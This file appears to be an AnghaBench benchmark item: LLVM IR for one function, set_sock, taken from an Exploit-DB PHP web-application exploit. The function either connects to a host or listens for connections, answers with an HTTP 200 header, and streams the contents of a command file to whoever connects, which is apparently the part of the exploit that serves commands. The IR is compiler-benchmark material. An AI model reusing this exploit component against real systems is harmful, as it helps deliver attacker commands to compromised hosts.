; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_982.c_set_sock.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_982.c_set_sock.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i8, %struct.in_addr, i8*, i8* }
%struct.in_addr = type { i32 }
%struct.hostent = type { i64 }
%struct.sockaddr = type { i32 }

@SEC_BUF = common dso_local global i32 0, align 4
@__const.set_sock.http_rq = private unnamed_addr constant [20 x i8] c"HTTP/1.1 200 OK\0D\0A\0D\0A\00", align 16
@SIGALRM = common dso_local global i32 0, align 4
@t_kill = common dso_local global i32 0, align 4
@DEF_TIME = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i8* null, align 8
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@sock = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@CMD_FILE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [2 x i8] c"r\00", align 1
@BK_LG = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @set_sock(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 8
  %9 = alloca %struct.sockaddr_in, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i64, align 8
  %17 = alloca i32*, align 8
  %18 = alloca [20 x i8], align 16
  %19 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 0, i32* %14, align 4
  %20 = load i32, i32* @SEC_BUF, align 4
  %21 = zext i32 %20 to i64
  %22 = call i8* @llvm.stacksave()
  store i8* %22, i8** %15, align 8
  %23 = alloca i8, i64 %21, align 16
  store i64 %21, i64* %16, align 8
  %24 = bitcast [20 x i8]* %18 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %24, i8* align 16 getelementptr inbounds ([20 x i8], [20 x i8]* @__const.set_sock.http_rq, i32 0, i32 0), i64 20, i1 false)
  %25 = load i32, i32* %7, align 4
  %26 = icmp ne i32 %25, 0
  br i1 %26, label %68, label %27

27:                                               ; preds = %3
  %28 = load i32, i32* @SIGALRM, align 4
  %29 = load i32, i32* @t_kill, align 4
  %30 = call i32 @signal(i32 %28, i32 %29)
  %31 = load i32, i32* @DEF_TIME, align 4
  %32 = call i32 @alarm(i32 %31)
  %33 = load i8*, i8** %5, align 8
  %34 = call %struct.hostent* @gethostbyname(i8* %33)
  store %struct.hostent* %34, %struct.hostent** %12, align 8
  %35 = icmp eq %struct.hostent* %34, null
  br i1 %35, label %36, label %37

36:                                               ; preds = %27
  store i32 -1, i32* %4, align 4
  store i32 1, i32* %19, align 4
  br label %172

37:                                               ; preds = %27
  %38 = load i8*, i8** @AF_INET, align 8
  %39 = load i32, i32* @SOCK_STREAM, align 4
  %40 = load i32, i32* @IPPROTO_TCP, align 4
  %41 = call i32 @socket(i8* %38, i32 %39, i32 %40)
  store i32 %41, i32* @sock, align 4
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %43, label %44

43:                                               ; preds = %37
  store i32 -1, i32* %4, align 4
  store i32 1, i32* %19, align 4
  br label %172

44:                                               ; preds = %37
  %45 = load i8*, i8** @AF_INET, align 8
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  store i8* %45, i8** %46, align 8
  %47 = load i32, i32* %6, align 4
  %48 = call i8* @htons(i32 %47)
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i8* %48, i8** %49, align 8
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  %51 = load %struct.hostent*, %struct.hostent** %12, align 8
  %52 = getelementptr inbounds %struct.hostent, %struct.hostent* %51, i32 0, i32 0
  %53 = load i64, i64* %52, align 8
  %54 = inttoptr i64 %53 to %struct.in_addr*
  %55 = bitcast %struct.in_addr* %50 to i8*
  %56 = bitcast %struct.in_addr* %54 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %55, i8* align 4 %56, i64 4, i1 false)
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %58 = call i32 @memset(i8* %57, i32 0, i32 8)
  %59 = load i32, i32* @sock, align 4
  %60 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %61 = call i32 @connect(i32 %59, %struct.sockaddr* %60, i32 4)
  %62 = icmp eq i32 %61, -1
  br i1 %62, label %63, label %66

63:                                               ; preds = %44
  %64 = load i32, i32* @sock, align 4
  %65 = call i32 @close(i32 %64)
  store i32 -1, i32* %4, align 4
  store i32 1, i32* %19, align 4
  br label %172

66:                                               ; preds = %44
  %67 = load i32, i32* @sock, align 4
  store i32 %67, i32* %4, align 4
  store i32 1, i32* %19, align 4
  br label %172

68:                                               ; preds = %3
  %69 = load i8*, i8** @AF_INET, align 8
  %70 = load i32, i32* @SOCK_STREAM, align 4
  %71 = load i32, i32* @IPPROTO_TCP, align 4
  %72 = call i32 @socket(i8* %69, i32 %70, i32 %71)
  store i32 %72, i32* %13, align 4
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %74, label %75

74:                                               ; preds = %68
  store i32 -1, i32* %4, align 4
  store i32 1, i32* %19, align 4
  br label %172

75:                                               ; preds = %68
  %76 = load i8*, i8** @AF_INET, align 8
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  store i8* %76, i8** %77, align 8
  %78 = load i32, i32* %6, align 4
  %79 = call i8* @htons(i32 %78)
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i8* %79, i8** %80, align 8
  %81 = load i32, i32* @INADDR_ANY, align 4
  %82 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  %83 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %82, i32 0, i32 0
  store i32 %81, i32* %83, align 4
  %84 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %85 = call i32 @memset(i8* %84, i32 0, i32 8)
  %86 = load i32, i32* %13, align 4
  %87 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %88 = call i32 @bind(i32 %86, %struct.sockaddr* %87, i32 4)
  %89 = icmp eq i32 %88, -1
  br i1 %89, label %90, label %93

90:                                               ; preds = %75
  %91 = load i32, i32* %13, align 4
  %92 = call i32 @close(i32 %91)
  store i32 -1, i32* %4, align 4
  store i32 1, i32* %19, align 4
  br label %172

93:                                               ; preds = %75
  %94 = load i32, i32* %13, align 4
  %95 = call i32 @listen(i32 %94, i32 10)
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %97, label %100

97:                                               ; preds = %93
  %98 = load i32, i32* %13, align 4
  %99 = call i32 @close(i32 %98)
  store i32 -1, i32* %4, align 4
  store i32 1, i32* %19, align 4
  br label %172

100:                                              ; preds = %93
  br label %101

101:                                              ; preds = %167, %100
  br label %102

102:                                              ; preds = %101
  store i32 24, i32* %11, align 4
  %103 = load i32, i32* %13, align 4
  %104 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %105 = call i32 @accept(i32 %103, %struct.sockaddr* %104, i32* %11)
  store i32 %105, i32* %10, align 4
  %106 = icmp eq i32 %105, -1
  br i1 %106, label %107, label %112

107:                                              ; preds = %102
  %108 = load i32, i32* %10, align 4
  %109 = call i32 @close(i32 %108)
  %110 = load i32, i32* %13, align 4
  %111 = call i32 @close(i32 %110)
  store i32 -1, i32* %4, align 4
  store i32 1, i32* %19, align 4
  br label %172

112:                                              ; preds = %102
  br label %113

113:                                              ; preds = %139, %112
  %114 = load i32, i32* %10, align 4
  %115 = call i64 @recv(i32 %114, i32* %14, i32 1, i32 0)
  %116 = icmp ne i64 %115, 0
  br i1 %116, label %117, label %140

117:                                              ; preds = %113
  %118 = load i32, i32* %14, align 4
  %119 = icmp eq i32 %118, 13
  br i1 %119, label %120, label %139

120:                                              ; preds = %117
  %121 = load i32, i32* %10, align 4
  %122 = call i64 @recv(i32 %121, i32* %14, i32 1, i32 0)
  %123 = load i32, i32* %14, align 4
  %124 = icmp eq i32 %123, 10
  br i1 %124, label %125, label %138

125:                                              ; preds = %120
  %126 = load i32, i32* %10, align 4
  %127 = call i64 @recv(i32 %126, i32* %14, i32 1, i32 0)
  %128 = load i32, i32* %14, align 4
  %129 = icmp eq i32 %128, 13
  br i1 %129, label %130, label %137

130:                                              ; preds = %125
  %131 = load i32, i32* %10, align 4
  %132 = call i64 @recv(i32 %131, i32* %14, i32 1, i32 0)
  %133 = load i32, i32* %14, align 4
  %134 = icmp eq i32 %133, 10
  br i1 %134, label %135, label %136

135:                                              ; preds = %130
  br label %140

136:                                              ; preds = %130
  br label %137

137:                                              ; preds = %136, %125
  br label %138

138:                                              ; preds = %137, %120
  br label %139

139:                                              ; preds = %138, %117
  br label %113

140:                                              ; preds = %135, %113
  %141 = load i32, i32* %10, align 4
  %142 = getelementptr inbounds [20 x i8], [20 x i8]* %18, i64 0, i64 0
  %143 = getelementptr inbounds [20 x i8], [20 x i8]* %18, i64 0, i64 0
  %144 = call i32 @strlen(i8* %143)
  %145 = call i32 @send(i32 %141, i8* %142, i32 %144, i32 0)
  %146 = load i32, i32* @CMD_FILE, align 4
  %147 = call i32* @fopen(i32 %146, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  store i32* %147, i32** %17, align 8
  %148 = icmp eq i32* %147, null
  br i1 %148, label %149, label %154

149:                                              ; preds = %140
  %150 = load i32, i32* %10, align 4
  %151 = call i32 @close(i32 %150)
  %152 = load i32, i32* %13, align 4
  %153 = call i32 @close(i32 %152)
  store i32 -1, i32* %4, align 4
  store i32 1, i32* %19, align 4
  br label %172

154:                                              ; preds = %140
  %155 = trunc i64 %21 to i32
  %156 = call i32 @memset(i8* %23, i32 0, i32 %155)
  br label %157

157:                                              ; preds = %163, %154
  %158 = sub i64 %21, 1
  %159 = trunc i64 %158 to i32
  %160 = load i32*, i32** %17, align 8
  %161 = call i64 @fgets(i8* %23, i32 %159, i32* %160)
  %162 = icmp ne i64 %161, 0
  br i1 %162, label %163, label %167

163:                                              ; preds = %157
  %164 = load i32, i32* %10, align 4
  %165 = call i32 @strlen(i8* %23)
  %166 = call i32 @send(i32 %164, i8* %23, i32 %165, i32 0)
  br label %157

167:                                              ; preds = %157
  %168 = load i32*, i32** %17, align 8
  %169 = call i32 @fclose(i32* %168)
  %170 = load i32, i32* %10, align 4
  %171 = call i32 @close(i32 %170)
  br label %101

172:                                              ; preds = %149, %107, %97, %90, %74, %66, %63, %43, %36
  %173 = load i8*, i8** %15, align 8
  call void @llvm.stackrestore(i8* %173)
  %174 = load i32, i32* %4, align 4
  ret i32 %174
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @signal(i32, i32) #3

declare dso_local i32 @alarm(i32) #3

declare dso_local %struct.hostent* @gethostbyname(i8*) #3

declare dso_local i32 @socket(i8*, i32, i32) #3

declare dso_local i8* @htons(i32) #3

declare dso_local i32 @memset(i8*, i32, i32) #3

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #3

declare dso_local i32 @close(i32) #3

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #3

declare dso_local i32 @listen(i32, i32) #3

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #3

declare dso_local i64 @recv(i32, i32*, i32, i32) #3

declare dso_local i32 @send(i32, i8*, i32, i32) #3

declare dso_local i32 @strlen(i8*) #3

declare dso_local i32* @fopen(i32, i8*) #3

declare dso_local i64 @fgets(i8*, i32, i32*) #3

declare dso_local i32 @fclose(i32*) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
